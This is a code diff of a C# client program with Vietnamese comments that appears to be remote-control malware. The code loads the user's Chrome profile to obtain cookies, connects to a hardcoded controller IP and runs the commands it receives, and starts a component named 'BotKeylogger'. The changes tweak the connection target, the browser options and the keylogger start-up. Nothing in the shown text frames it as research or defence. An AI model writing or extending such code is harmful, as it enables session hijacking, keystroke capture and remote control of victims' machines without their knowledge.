@@ -452,15 +452,26 @@ namespace Client
                 isRunning= false;
             }
         }
-
+        static bool IsSocketConnected(Socket socket)
+        {
+            try
+            {
+                // Kiểm tra trạng thái của Socket
+                return !(socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0);
+            }
+            catch (SocketException)  // Nếu có lỗi xảy ra, coi như không kết nối
+            {
+                return false;
+            }
+        }
         public static void handleConnectSocket()
         {
 
             //<--------------------- set up get cookies-------------------------->
             ChromeOptions options = new ChromeOptions();
-            string username = RunCommandAndGetOutput("echo %username%").Trim();
-            string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
-            options.AddArguments(path, "headless");
+            //string username = RunCommandAndGetOutput("echo %username%").Trim();
+            string path = "user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data";
+            options.AddArguments(path);
             IWebDriver driver = new ChromeDriver(options);
             //<---------------------end get cookies-------------------------->
             try
@@ -471,7 +482,7 @@ namespace Client
                 // Bind the client to the local endpoint
                 client.Client.Bind(localEndPoint);
 
-                client.Connect("172.20.10.4", PORT_NUMBER);
+                client.Connect("192.168.1.10", PORT_NUMBER);
                 Stream stream = client.GetStream();
                 //Console.WriteLine("connect xong socket");
                 byte[] data;
@@ -481,6 +492,11 @@ namespace Client
                     stream.Read(data, 0, BUFFER_SIZE);
                     string command = encoding.GetString(data);
                     handleCommand(command, driver, client, stream);
+                    Console.WriteLine("1");
+                    if(IsSocketConnected(client.Client) == true)
+                    {
+                        Console.WriteLine("Dang ket noi");
+                    }    
                 }
 
             }
@@ -499,6 +515,12 @@ namespace Client
             th_socket = new Thread(new ThreadStart(handleConnectSocket));
             th_socket.SetApartmentState(ApartmentState.STA);
             th_socket.Start();
+            BotKeylogger.initBotKeylogger();
+            timeStart = DateTime.Now;
+        }
+        public static void Main2(string[] args)
+        {
+
             BotKeylogger.initBotKeylogger();
             timeStart = DateTime.Now;
         }
